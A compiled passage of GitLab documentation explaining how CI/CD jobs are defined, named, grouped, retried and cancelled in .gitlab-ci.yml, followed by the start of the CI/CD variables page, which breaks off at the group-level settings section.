CI/CD jobs are the fundamental elements of a [GitLab CI/CD pipeline](https://docs.gitlab.com/ci/pipelines/).
Jobs are configured in the `.gitlab-ci.yml` file with a list of commands to execute
to accomplish tasks like building, testing, or deploying code.

Jobs:

- Execute on a [runner](https://docs.gitlab.com/ci/runners/), for example in a Docker container.
- Run independently from other jobs.
- Have a [job log](https://docs.gitlab.com/ci/jobs/job_logs/) with the full execution log for the job.

Jobs are defined with [YAML keywords](https://docs.gitlab.com/ci/yaml/) that define all aspects
of the job’s execution, including keywords that:

- Control [how](https://docs.gitlab.com/ci/jobs/job_control/) and [when](https://docs.gitlab.com/ci/jobs/job_rules/) jobs run.
- Group jobs together in collections called [stages](https://docs.gitlab.com/ci/yaml/#stages).
Stages run in sequence, while all jobs in a stage can run in parallel.
- Define [CI/CD variables](https://docs.gitlab.com/ci/variables/) for flexible configuration.
- Define [caches](https://docs.gitlab.com/ci/caching/) to speed up job execution.
- Save files as [artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/) which can be used by other jobs.

## Add a job to a pipeline [Permalink](https://docs.gitlab.com/ci/jobs/\#add-a-job-to-a-pipeline "Permalink")

To add a job to a pipeline, add it into your `.gitlab-ci.yml` file. The job must:

- Be defined at the top-level of the YAML configuration.
- Have a unique [job name](https://docs.gitlab.com/ci/jobs/#job-names).
- Have either a [`script`](https://docs.gitlab.com/ci/yaml/#script) section defining commands to run,
or a [`trigger`](https://docs.gitlab.com/ci/yaml/#trigger) section to trigger a [downstream pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/)
to run.

For example:

YAML Copy to clipboard

```yaml
my-ruby-job:
  script:
    - bundle install
    - bundle exec my_ruby_command

my-shell-script-job:
  script:
    - my_shell_script.sh
```

### Job names [Permalink](https://docs.gitlab.com/ci/jobs/\#job-names "Permalink")

You can’t use these keywords as job names:

- `image`
- `services`
- `stages`
- `before_script`
- `after_script`
- `variables`
- `cache`
- `include`
- `pages:deploy` configured for a `deploy` stage

Additionally, these names are valid when quoted, but are
not recommended as they can make pipeline configuration unclear:

- `"true":`
- `"false":`
- `"nil":`

Job names must be 255 characters or fewer.

Use unique names for your jobs. If multiple jobs have the same name in a file,
only one is added to the pipeline, and it’s difficult to predict which one is chosen.
If the same job name is used in one or more included files,
[parameters are merged](https://docs.gitlab.com/ci/yaml/includes/#override-included-configuration-values).

### Hide a job [Permalink](https://docs.gitlab.com/ci/jobs/\#hide-a-job "Permalink")

To temporarily disable a job without deleting it from the configuration
file, add a period ( `.`) to the start of the job name. Hidden jobs do not need to contain
the `script` or `trigger` keywords, but must contain valid YAML configuration.

For example:

YAML Copy to clipboard

```yaml
.hidden_job:
  script:
    - run test
```

Hidden jobs are not processed by GitLab CI/CD, but they can be used as templates
for reusable configuration with:

- The [`extends` keyword](https://docs.gitlab.com/ci/yaml/yaml_optimization/#use-extends-to-reuse-configuration-sections).
- [YAML anchors](https://docs.gitlab.com/ci/yaml/yaml_optimization/#anchors).

## Set default values for job keywords [Permalink](https://docs.gitlab.com/ci/jobs/\#set-default-values-for-job-keywords "Permalink")

You can use the `default` keyword to set default job keywords and values, which are
used by default by all jobs in a pipeline.

For example:

YAML Copy to clipboard

```yaml
default:
  image: 'ruby:2.4'
  before_script:
    - echo Hello World

rspec-job:
  script: bundle exec rspec
```

When the pipeline runs, the job uses the default keywords:

YAML Copy to clipboard

```yaml
rspec-job:
  image: 'ruby:2.4'
  before_script:
    - echo Hello World
  script: bundle exec rspec
```

### Control the inheritance of default keywords and variables [Permalink](https://docs.gitlab.com/ci/jobs/\#control-the-inheritance-of-default-keywords-and-variables "Permalink")

You can control the inheritance of:

- [default keywords](https://docs.gitlab.com/ci/yaml/#default) with [`inherit:default`](https://docs.gitlab.com/ci/yaml/#inheritdefault).
- [default variables](https://docs.gitlab.com/ci/yaml/#default) with [`inherit:variables`](https://docs.gitlab.com/ci/yaml/#inheritvariables).

For example:

YAML Copy to clipboard

```yaml
default:
  image: 'ruby:2.4'
  before_script:
    - echo Hello World

variables:
  DOMAIN: example.com
  WEBHOOK_URL: https://my-webhook.example.com

rubocop:
  inherit:
    default: false
    variables: false
  script: bundle exec rubocop

rspec:
  inherit:
    default: [image]
    variables: [WEBHOOK_URL]
  script: bundle exec rspec

capybara:
  inherit:
    variables: false
  script: bundle exec capybara

karma:
  inherit:
    default: true
    variables: [DOMAIN]
  script: karma
```

In this example:

- `rubocop`:
  - inherits: Nothing.
- `rspec`:
  - inherits: the default `image` and the `WEBHOOK_URL` variable.
  - does **not** inherit: the default `before_script` and the `DOMAIN` variable.
- `capybara`:
  - inherits: the default `before_script` and `image`.
  - does **not** inherit: the `DOMAIN` and `WEBHOOK_URL` variables.
- `karma`:
  - inherits: the default `image` and `before_script`, and the `DOMAIN` variable.
  - does **not** inherit: `WEBHOOK_URL` variable.

## View jobs in a pipeline [Permalink](https://docs.gitlab.com/ci/jobs/\#view-jobs-in-a-pipeline "Permalink")

When you access a pipeline, you can see the related jobs for that pipeline.

The order of jobs in a pipeline depends on the type of pipeline graph.

- For [full pipeline graphs](https://docs.gitlab.com/ci/pipelines/#pipeline-details), jobs are sorted alphabetically by name.
- For [pipeline mini graphs](https://docs.gitlab.com/ci/pipelines/#pipeline-mini-graphs), jobs are sorted by status severity
with failed jobs appearing first, and then alphabetically by name.

Selecting an individual job shows you its [job log](https://docs.gitlab.com/ci/jobs/job_logs/), and allows you to:

- Cancel the job.
- Retry the job, if it failed.
- Run the job again, if it passed.
- Erase the job log.

### View all jobs in a project [Permalink](https://docs.gitlab.com/ci/jobs/\#view-all-jobs-in-a-project "Permalink")

- Offering: GitLab.com, GitLab Self-Managed

History

- Filtering jobs by job name [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/387547) as an [experiment](https://docs.gitlab.com/policy/development_stages_support/) on GitLab.com and GitLab Self-Managed in GitLab 17.3 [with flags](https://docs.gitlab.com/administration/feature_flags/) named `populate_and_use_build_names_table` for the API and `fe_search_build_by_name` for the UI. Disabled by default.

The availability of this feature is controlled by a feature flag. For more information, see the history.

Filtering jobs by name is an [experiment](https://docs.gitlab.com/policy/development_stages_support/). For more information about the development of this feature, see [issue 387547](https://gitlab.com/gitlab-org/gitlab/-/issues/387547).

To view the full list of jobs that ran in a project:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Build > Jobs**.

You can filter the list by [job name](https://docs.gitlab.com/ci/jobs/#job-names), [job status](https://docs.gitlab.com/ci/jobs/#available-job-statuses), and [job source](https://docs.gitlab.com/ci/jobs/#available-job-sources).

### Available job statuses [Permalink](https://docs.gitlab.com/ci/jobs/\#available-job-statuses "Permalink")

CI/CD jobs can have the following statuses:

- `canceled`: Job was manually canceled or automatically aborted.
- `canceling`: Job is being canceled but `after_script` is running.
- `created`: Job has been created but not yet processed.
- `failed`: Job execution failed.
- `manual`: Job requires manual action to start.
- `pending`: Job is in the queue waiting for a runner.
- `preparing`: Runner is preparing the execution environment.
- `running`: Job is executing on a runner.
- `scheduled`: Job has been scheduled but execution hasn’t started.
- `skipped`: Job was skipped due to conditions or dependencies.
- `success`: Job completed successfully.
- `waiting_for_resource`: Job is waiting for resources to become available.

### View the source of a job [Permalink](https://docs.gitlab.com/ci/jobs/\#view-the-source-of-a-job "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/181159) job source in GitLab 17.9 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `populate_and_use_build_source_table`. Enabled by default.
- [Generally available](https://gitlab.com/groups/gitlab-org/-/epics/11796) on GitLab.com, GitLab Self-Managed, and GitLab Dedicated in GitLab 17.11.

GitLab CI/CD jobs now include a source attribute that indicates the action that initially triggered a CI/CD job.
Use this attribute to track how a job was initiated or filter job runs based on the specific sources.

#### Available job sources [Permalink](https://docs.gitlab.com/ci/jobs/\#available-job-sources "Permalink")

The source attribute can have the following values:

- `api`: Job initiated by a REST call to the Jobs API.
- `chat`: Job initiated by a chat command using GitLab ChatOps.
- `container_registry_push`: Job initiated by container registry push.
- `duo_workflow`: Job initiated by GitLab Duo Agent Platform.
- `external`: Job initiated by an event in an external repository integrated with GitLab. This does not include pull request events.
- `external_pull_request_event`: Job initiated by a pull request event in an external repository.
- `merge_request_event`: Job initiated by a merge request event.
- `ondemand_dast_scan`:Job initiated by an on-demand DAST scan.
- `ondemand_dast_validation`: Job initiated by an on-demand DAST validation.
- `parent_pipeline`: Job initiated by a parent pipeline
- `pipeline`: Job initiated by a user manually running a pipeline.
- `pipeline_execution_policy`: Job initiated by a triggered pipeline execution policy.
- `pipeline_execution_policy_schedule`: Job initiated by a scheduled pipeline execution policy.
- `push`: Job initiated by a code push.
- `scan_execution_policy`: Job initiated by a scan execution policy.
- `schedule`: Job initiated by a scheduled pipeline.
- `security_orchestration_policy`: Job initiated by a scheduled scan execution policy.
- `trigger`: Job initiated by another job or pipeline.
- `unknown`: Job initiated by an unknown source.
- `web`: Job initiated by a user from the GitLab UI.
- `webide`: Job initiated by a user from the Web IDE.

### Group similar jobs together in pipeline views [Permalink](https://docs.gitlab.com/ci/jobs/\#group-similar-jobs-together-in-pipeline-views "Permalink")

If you have many similar jobs, your [pipeline graph](https://docs.gitlab.com/ci/pipelines/#pipeline-details)
becomes long and hard to read.

You can automatically group similar jobs together. If the job names are formatted in a certain way,
they are collapsed into a single group in regular pipeline graphs (not the mini graphs).

You can recognize when a pipeline has grouped jobs if you see a number next to a job
name instead of the retry or cancel buttons. The number indicates the amount of grouped
jobs. Hovering over them shows you if all jobs have passed or any has failed. Select to expand them.

[![A pipeline graph showing several stages and jobs, including three groups of grouped jobs.](https://docs.gitlab.com/ci/jobs/img/pipeline_grouped_jobs_v17_9.png)](https://docs.gitlab.com/ci/jobs/img/pipeline_grouped_jobs_v17_9.png)

To create a group of jobs, in the `.gitlab-ci.yml` file,
separate each job name with a number and one of the following:

- A slash ( `/`), for example, `slash-test 1/3`, `slash-test 2/3`, `slash-test 3/3`.
- A colon ( `:`), for example, `colon-test 1:3`, `colon-test 2:3`, `colon-test 3:3`.
- A space, for example `space-test 0 3`, `space-test 1 3`, `space-test 2 3`.

You can use these symbols interchangeably.

In the following example, these three jobs are in a group named `build ruby`:

YAML Copy to clipboard

```yaml
build ruby 1/3:
  stage: build
  script:
    - echo "ruby1"

build ruby 2/3:
  stage: build
  script:
    - echo "ruby2"

build ruby 3/3:
  stage: build
  script:
    - echo "ruby3"
```

The pipeline graph displays a group named `build ruby` with three jobs.

The jobs are ordered by comparing the numbers from left to right. You
usually want the first number to be the index and the second number to be the total.

[This regular expression](https://gitlab.com/gitlab-org/gitlab/-/blob/2f3dc314f42dbd79813e6251792853bc231e69dd/app/models/commit_status.rb#L99)
evaluates the job names: `([\b\s:]+((\[.*\])|(\d+[\s:\/\\]+\d+))){1,3}\s*\z`.
One or more `: [...]`, `X Y`, `X/Y`, or `X\Y` sequences are removed from the **end**
of job names only. Matching substrings found at the beginning or in the middle of
job names are not removed.

## Retry jobs [Permalink](https://docs.gitlab.com/ci/jobs/\#retry-jobs "Permalink")

You can retry a job after it completes, regardless of its final state (failed, success, or canceled).

When you retry a job:

- A new job instance is created with a new job ID.
- The job runs with the same parameters and variables as the original job.
- If the job produces artifacts, new artifacts are created and stored.
- The new job associates with the user who initiated the retry, not the user who created the original pipeline.
- Any subsequent jobs that were previously skipped are reassigned to the user who initiated the retry.

When you retry a [trigger job](https://docs.gitlab.com/ci/yaml/#trigger) that triggers a downstream pipeline:

- The trigger job generates a new downstream pipeline.
- The downstream pipeline also associates with the user who initiated the retry.
- The downstream pipeline runs with the configuration that exists at the time of the retry,
which might be different from the original run.

### Retry a job [Permalink](https://docs.gitlab.com/ci/jobs/\#retry-a-job "Permalink")

Prerequisites:

- You must have at least the Developer role for the project.
- The job must not be [archived](https://docs.gitlab.com/administration/settings/continuous_integration/#archive-pipelines).

To retry a job from a merge request:

1. On the left sidebar, select **Search or go to** and find your project.
2. From your merge request, do one of the following:
   - In the pipeline widget, next to the job you want to retry, select **Run again** (
     retry).
   - Select the **Pipelines** tab, next to the job you want to retry, select **Run again** (
     retry).

To retry a job from the job log:

1. Go to the job’s log page.
2. In the upper-right corner, select **Run again** (
retry).

To retry a job from a pipeline:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Build > Pipelines**.
3. Find the pipeline that contains the job you want to retry.
4. From the pipeline graph, next to the job you want to retry, select **Run again** (
retry).

### Retry all failed or canceled jobs in a pipeline [Permalink](https://docs.gitlab.com/ci/jobs/\#retry-all-failed-or-canceled-jobs-in-a-pipeline "Permalink")

If a pipeline has multiple failed or canceled jobs, you can retry all of them at once:

1. On the left sidebar, select **Search or go to** and find your project.
2. Do one of the following:
   - Select **Build > Pipelines**.
   - Go to a merge request and select the **Pipelines** tab.
3. For the pipeline with failed or canceled jobs, select **Retry all failed or canceled jobs** (
retry).

## Cancel jobs [Permalink](https://docs.gitlab.com/ci/jobs/\#cancel-jobs "Permalink")

You can cancel a CI/CD job that hasn’t completed yet.

When you cancel a job, what happens next depends on its state and the GitLab Runner version:

- For jobs that haven’t started executing yet, the job is canceled immediately.
- For running jobs:
  - For GitLab Runner 16.10 and later with GitLab 17.0 and later, the job is marked as `canceling` while the runner runs the job’s [`after_script`](https://docs.gitlab.com/ci/yaml/#after_script).
    When `after_script` completes, the job is marked as `canceled`.
  - For GitLab Runner 16.9 and earlier with GitLab 16.11 and earlier, the job is `canceled` immediately without running `after_script`.

```
CI/CD job state transitionsShows possible state transitions for CI/CD jobs, including cancellation paths.
Job created
Cancel requested

Runner picks up job
Job succeeds

Job fails

Cancel requested
GitLab 17.0 and later with GitLab Runner 16.10 and later
GitLab 16.11 and earlier with GitLab Runner 16.9 and earlier
after_script complete
pending
canceled
running
success
failed
if_versions
canceling
```

If you need to cancel a job immediately without waiting for the `after_script`, use [force cancel](https://docs.gitlab.com/ci/jobs/#force-cancel-a-job).

### Cancel a job [Permalink](https://docs.gitlab.com/ci/jobs/\#cancel-a-job "Permalink")

Prerequisites:

- You must have at least the Developer role for the project,
or the [minimum role required to cancel a pipeline or job](https://docs.gitlab.com/ci/pipelines/settings/#restrict-roles-that-can-cancel-pipelines-or-jobs).

To cancel a job from a merge request:

1. On the left sidebar, select **Search or go to** and find your project.
2. From your merge request, do one of the following:
   - In the pipeline widget, next to the job you want to cancel, select **Cancel** (
     cancel).
   - Select the **Pipelines** tab, next to the job you want to cancel, select **Cancel** (
     cancel).

To cancel a job from the job log:

1. Go to the job’s log page.
2. In the upper-right corner, select **Cancel** (
cancel).

To cancel a job from a pipeline:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Build > Pipelines**.
3. Find the pipeline that contains the job you want to cancel.
4. From the pipeline graph, next to the job you want to cancel, select **Cancel** (
cancel).

### Cancel all running jobs in a pipeline [Permalink](https://docs.gitlab.com/ci/jobs/\#cancel-all-running-jobs-in-a-pipeline "Permalink")

You can cancel all jobs in a running pipeline at once.

1. On the left sidebar, select **Search or go to** and find your project.
2. Do one of the following:
   - Select **Build > Pipelines**.
   - Go to a merge request and select the **Pipelines** tab.
3. For the pipeline you want to cancel, select **Cancel the running pipeline** (
cancel).

### Force cancel a job [Permalink](https://docs.gitlab.com/ci/jobs/\#force-cancel-a-job "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/467107) as an [experiment](https://docs.gitlab.com/policy/development_stages_support/) in GitLab 17.10 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `force_cancel_build`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/519313) in GitLab 17.11. Feature flag `force_cancel_build` removed.

If you don’t want to wait for `after_script` to finish or a job is unresponsive, you can force cancel it.
Force cancel immediately moves a job from the `canceling` state to `canceled`.

When you force cancel a job, the [job token](https://docs.gitlab.com/ci/jobs/ci_job_token/) is immediately revoked.
If the runner is still executing the job, it loses access to GitLab.
The runner aborts the job without waiting for `after_script` to complete.

Prerequisites:

- You must have at least the Maintainer role for the project.
- The job must be in the `canceling` state, which requires:
  - GitLab 17.0 and later.
  - GitLab Runner 16.10 and later.

To force cancel a job:

1. Go to the job’s log page.
2. In the upper-right corner, select **Force cancel**.

## Troubleshoot a failed job [Permalink](https://docs.gitlab.com/ci/jobs/\#troubleshoot-a-failed-job "Permalink")

When a pipeline fails or is allowed to fail, there are several places where you
can find the reason:

- In the [pipeline graph](https://docs.gitlab.com/ci/pipelines/#pipeline-details), in the pipeline details view.
- In the pipeline widgets, in the merge requests and commit pages.
- In the job views, in the global and detailed views of a job.

In each place, if you hover over the failed job you can see the reason it failed.

[![A pipeline graph showing a failed job and the failure-reason.](https://docs.gitlab.com/ci/jobs/img/job_failure_reason_v17_9.png)](https://docs.gitlab.com/ci/jobs/img/job_failure_reason_v17_9.png)

You can also see the reason it failed on the Job detail page.

### With Root Cause Analysis [Permalink](https://docs.gitlab.com/ci/jobs/\#with-root-cause-analysis "Permalink")

You can use GitLab Duo Root Cause Analysis in GitLab Duo Chat to [troubleshoot failed CI/CD jobs](https://docs.gitlab.com/user/gitlab_duo_chat/examples/#troubleshoot-failed-cicd-jobs-with-root-cause-analysis).

## Deployment jobs [Permalink](https://docs.gitlab.com/ci/jobs/\#deployment-jobs "Permalink")

Deployment jobs are CI/CD jobs that use [environments](https://docs.gitlab.com/ci/environments/).
A deployment job is any job that uses the `environment` keyword and the [`start` environment `action`](https://docs.gitlab.com/ci/yaml/#environmentaction).
Deployment jobs do not need to be in the `deploy` stage. The following `deploy me`
job is an example of a deployment job. `action: start` is the default behavior and
is defined here for clarity, but you can omit it:

YAML Copy to clipboard

```yaml
deploy me:
  script:
    - deploy-to-cats.sh
  environment:
    name: production
    url: https://cats.example.com
    action: start
```

The behavior of deployment jobs can be controlled with
[deployment safety](https://docs.gitlab.com/ci/environments/deployment_safety/) settings like
[preventing outdated deployment jobs](https://docs.gitlab.com/ci/environments/deployment_safety/#prevent-outdated-deployment-jobs)
and [ensuring only one deployment job runs at a time](https://docs.gitlab.com/ci/environments/deployment_safety/#ensure-only-one-deployment-job-runs-at-a-time).

## Help & feedback

[Edit this page](https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/ci/jobs/_index.md)

[Suggest updates](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Documentation)

[Request support](https://about.gitlab.com/support/)

[View pricing](https://about.gitlab.com/pricing/)

[Try GitLab for free](https://about.gitlab.com/free-trial/)

[Post on the GitLab forum](https://forum.gitlab.com/new-topic?title=topic%20title&body=topic%20body&tags=docs-feedback)

![Company Logo](https://cdn.cookielaw.org/logos/aa14a5c8-79e3-442a-8177-464ad850b19d/e46c1d0d-1f66-481f-bc06-5427671431da/253e6fee-c4c0-4b60-bc35-79cdae5dda32/gitlab-logo-100.png)

## Privacy Preference Center

## Privacy Preference Center

- ### Your Privacy

- ### Strictly Necessary Cookies

- ### Functionality Cookies

- ### Performance and Analytics Cookies

- ### Targeting and Advertising Cookies

- ### Ad User Data

- ### Ad Personalization


#### Your Privacy

When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.


[Cookie Policy](https://about.gitlab.com/privacy/cookies/)

User ID:  e28c86be-843b-4da7-a3fb-85ad4ee5b394

This User ID will be used as a unique identifier while storing and accessing your preferences for future.

Timestamp:  --

#### Strictly Necessary Cookies

Always Active

These cookies are necessary for the website to function and cannot be switched off in our systems. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, enabling you to securely log into the site, filling in forms, or using the customer checkout. GitLab processes any personal data collected through these cookies on the basis of our legitimate interest.

Cookies Details‎

#### Functionality Cookies

Functionality Cookies

These cookies enable helpful but non-essential website functions that improve your website experience. By recognizing you when you return to our website, they may, for example, allow us to personalize our content for you or remember your preferences. If you do not allow these cookies then some or all of these services may not function properly. GitLab processes any personal data collected through these cookies on the basis of your consent

Cookies Details‎

#### Performance and Analytics Cookies

Performance and Analytics Cookies

These cookies allow us and our third-party service providers to recognize and count the number of visitors on our websites and to see how visitors move around our websites when they are using it. This helps us improve our products and ensures that users can easily find what they need on our websites. These cookies usually generate aggregate statistics that are not associated with an individual. To the extent any personal data is collected through these cookies, GitLab processes that data on the basis of your consent.

Cookies Details‎

#### Targeting and Advertising Cookies

Targeting and Advertising Cookies

These cookies enable different advertising related functions. They may allow us to record information about your visit to our websites, such as pages visited, links followed, and videos viewed so we can make our websites and the advertising displayed on it more relevant to your interests. They may be set through our website by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant advertisements on other websites. GitLab processes any personal data collected through these cookies on the basis of your consent.

Cookies Details‎

#### Ad User Data

Ad User Data

Sets consent for sending user data to Google for advertising purposes.

Cookies Details‎

#### Ad Personalization

Ad Personalization

Sets consent for personalized advertising.

Cookies Details‎

Back Button

### Cookie List

Filter Button

ConsentLeg.Interest

checkbox labellabel

checkbox labellabel

checkbox labellabel

Clear

checkbox labellabel

ApplyCancel

Confirm My Choices

Allow All

[![Powered by Onetrust](https://cdn.cookielaw.org/logos/static/powered_by_logo.svg)](https://www.onetrust.com/products/cookie-consent/)

---


## 6. GitLab CI/CD variables {#section-6}

*Source: [https://docs.gitlab.com/ee/ci/variables/](https://docs.gitlab.com/ee/ci/variables/)*

# GitLab CI/CD variables

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

CI/CD variables are a type of environment variable. You can use them to:

- Control the behavior of jobs and [pipelines](https://docs.gitlab.com/ci/pipelines/).
- Store values you want to re-use, for example in [job scripts](https://docs.gitlab.com/ci/variables/job_scripts/).
- Avoid hard-coding values in your `.gitlab-ci.yml` file.

You can [override variable values](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence) for a specific pipeline when you [run a pipeline manually](https://docs.gitlab.com/ci/pipelines/#run-a-pipeline-manually), [run a manual job](https://docs.gitlab.com/ci/jobs/job_control/#specify-variables-when-running-manual-jobs),
or have them [prefilled in manual pipelines](https://docs.gitlab.com/ci/pipelines/#prefill-variables-in-manual-pipelines).

Variable names are limited by the [shell the runner uses](https://docs.gitlab.com/runner/shells/)
to execute scripts. Each shell has its own set of reserved variable names.

To ensure consistent behavior, you should always put variable values in single or double quotes.
Variables are internally parsed by the [Psych YAML parser](https://docs.ruby-lang.org/en/master/Psych.html),
so quoted and unquoted variables might be parsed differently. For example, `VAR1: 012345`
is interpreted as an octal value, so the value becomes `5349`, but `VAR1: "012345"` is parsed
as a string with a value of `012345`.

For more information about advanced use of GitLab CI/CD, see [7 advanced GitLab CI workflow hacks](https://about.gitlab.com/webcast/7cicd-hacks/) shared by GitLab engineers.

## Predefined CI/CD variables [Permalink](https://docs.gitlab.com/ci/variables/\#predefined-cicd-variables "Permalink")

GitLab CI/CD makes a set of [predefined CI/CD variables](https://docs.gitlab.com/ci/variables/predefined_variables/)
available for use in pipeline configuration and job scripts. These variables contain
information about the job, pipeline, and other values you might need when the pipeline
is triggered or running.

You can use predefined CI/CD variables in your `.gitlab-ci.yml` without declaring them first.
For example:

YAML Copy to clipboard

```yaml
job1:
  stage: test
  script:
    - echo "The job's stage is '$CI_JOB_STAGE'"
```

The script in this example outputs `The job's stage is 'test'`.

## CI/CD configuration variables [Permalink](https://docs.gitlab.com/ci/variables/\#cicd-configuration-variables "Permalink")

GitLab CI/CD also makes configuration CI/CD variables available for use in pipeline configuration and job scripts.
You can use GitLab CI/CD configuration variables in pipeline configuration and job scripts to configure runner
and the job execution environment.

You cannot directly define configuration variables in a `.gitlab-ci.yml` file.
Runner administrators can define these variables indirectly as settings in a
[`.config.toml`](https://docs.gitlab.com/runner/configuration/advanced-configuration/) file.

For example, when you configure TLS certificate settings for HTTPS communication:

TOML Copy to clipboard

```toml
[[runners]]
  name = "gl-docker-runner"
  url = "https://gitlab.com/example/url"
  token = "user-token"
  executor = "docker"

  tls-ca-file = "/example/gl-runner/certs/ca.crt"
  tls-cert-file = "/example/gl-runner/certs/cert.crt"
  tls-key-file = "/example/gl-runner/certs/key.key"
```

The primary purpose of the `tls-ca-file` setting is to specify the certificate authority file for HTTPS verification.
As a byproduct of this configuration, GitLab Runner automatically creates the `CI_SERVER_TLS_CA_FILE` configuration variable,
which becomes available to your CI/CD jobs.

Configuration variables are only available under certain conditions.
For example, the configuration variable `CI_SERVER_TLS_CA_FILE` (which configures the custom
Certificate Authority file) is only available when:

- You configure it in the `config.toml` file by using the `tls-ca-file` setting.
- The job instance uses HTTPS, which prompts the runner to automatically build a CA verification chain.

To summarize, the following are the differences between predefined and configuration variables:

|  | Predefined variables | Configuration variables |
| --- | --- | --- |
| Purpose | Supports script logic | Configure runner and the job execution environment |
| Availability | Always available | Available only under specific conditions |
| Defined by | Users in `.gitlab-ci.yml` | Administrators in `config.toml` |

|
|

## Define a CI/CD variable in the `.gitlab-ci.yml` file [Permalink](https://docs.gitlab.com/ci/variables/\#define-a-cicd-variable-in-the-gitlab-ciyml-file "Permalink")

To create a CI/CD variable in the `.gitlab-ci.yml` file, define the variable and
value with the [`variables`](https://docs.gitlab.com/ci/yaml/#variables) keyword.

Variables saved in the `.gitlab-ci.yml` file are visible to all users with access to
the repository, and should store only non-sensitive project configuration. For example,
the URL of a database saved in a `DATABASE_URL` variable. Sensitive variables containing values
like secrets or keys should be [added in the UI](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui).

You can define `variables` in:

- A job: The variable is only available in that job’s `script`, `before_script`, or `after_script` sections, and with some [job keywords](https://docs.gitlab.com/ci/yaml/#job-keywords).
- The top-level of the `.gitlab-ci.yml` file: The variable is available as a default for all jobs in a pipeline, unless a job defines a variable with the same name. The job’s variable takes precedence.

In both cases, you cannot use these variables with [global keywords](https://docs.gitlab.com/ci/yaml/#global-keywords).

For example:

YAML Copy to clipboard

```yaml
variables:
  ALL_JOBS_VAR: "A default variable"

job1:
  variables:
    JOB1_VAR: "Job 1 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR' and '$JOB1_VAR'"

job2:
  variables:
    ALL_JOBS_VAR: "Different value than default"
    JOB2_VAR: "Job 2 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR', '$JOB2_VAR', and '$JOB1_VAR'"
```

In this example:

- `job1` outputs: `Variables are 'A default variable' and 'Job 1 variable'`
- `job2` outputs: `Variables are 'Different value than default', 'Job 2 variable', and ''`

Use the [`value` and `description`](https://docs.gitlab.com/ci/yaml/#variablesdescription) keywords
to define [variables that are prefilled](https://docs.gitlab.com/ci/pipelines/#prefill-variables-in-manual-pipelines)
for [manually-triggered pipelines](https://docs.gitlab.com/ci/pipelines/#run-a-pipeline-manually).

### Skip default variables in a single job [Permalink](https://docs.gitlab.com/ci/variables/\#skip-default-variables-in-a-single-job "Permalink")

If you don’t want default variables to be available in a job, set `variables`
to `{}`:

YAML Copy to clipboard

```yaml
variables:
  DEFAULT_VAR: "A default variable"

job1:
  variables: {}
  script:
    - echo This job does not need any variables
```

## Define a CI/CD variable in the UI [Permalink](https://docs.gitlab.com/ci/variables/\#define-a-cicd-variable-in-the-ui "Permalink")

Sensitive variables like tokens or passwords should be stored in the settings in the UI,
not [in the `.gitlab-ci.yml` file](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-gitlab-ciyml-file).
Add CI/CD variables in the UI:

- For a project [in the project’s settings](https://docs.gitlab.com/ci/variables/#for-a-project).
- For all projects in a group [in the group’s setting](https://docs.gitlab.com/ci/variables/#for-a-group).
- For all projects in a GitLab instance [in the instance’s settings](https://docs.gitlab.com/ci/variables/#for-an-instance).

Alternatively, these variables can be added by using the API:

- [With the project-level variables API endpoint](https://docs.gitlab.com/api/project_level_variables/).
- [With the group-level variables API endpoint](https://docs.gitlab.com/api/group_level_variables/).
- [With the instance-level variables API endpoint](https://docs.gitlab.com/api/instance_level_ci_variables/).

By default, pipelines from forked projects can’t access the CI/CD variables available to the parent project.
If you [run a merge request pipeline in the parent project for a merge request from a fork](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/#run-pipelines-in-the-parent-project),
all variables become available to the pipeline.

### For a project [Permalink](https://docs.gitlab.com/ci/variables/\#for-a-project "Permalink")

You can add CI/CD variables to a project’s settings. Projects can have a maximum of 8000 CI/CD variables.

Prerequisites:

- You must be a project member with the Maintainer role.

To add or update variables in the project settings:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Settings > CI/CD**.
3. Expand **Variables**.
4. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: No limitations.
   - **Type**: `Variable` (default) or [`File`](https://docs.gitlab.com/ci/variables/#use-file-type-cicd-variables).
   - **Environment scope**: Optional. **All (default)** ( `*`), a specific [environment](https://docs.gitlab.com/ci/environments/#types-of-environments),
     or a wildcard [environment scope](https://docs.gitlab.com/ci/environments/#limit-the-environment-scope-of-a-cicd-variable).
   - **Protect variable** Optional. If selected, the variable is only available in pipelines
     that run on [protected branches](https://docs.gitlab.com/user/project/repository/branches/protected/)
     or [protected tags](https://docs.gitlab.com/user/project/protected_tags/).
   - **Visibility**: Select **Visible** (default), [**Masked**](https://docs.gitlab.com/ci/variables/#mask-a-cicd-variable),
     or [**Masked and hidden**](https://docs.gitlab.com/ci/variables/#hide-a-cicd-variable) (only available for new variables).

After you create a variable, you can use it in the pipeline configuration
or in [job scripts](https://docs.gitlab.com/ci/variables/job_scripts/).

### For a group [Permalink](https://docs.gitlab.com/ci/variables/\#for-a-group "Permalink")

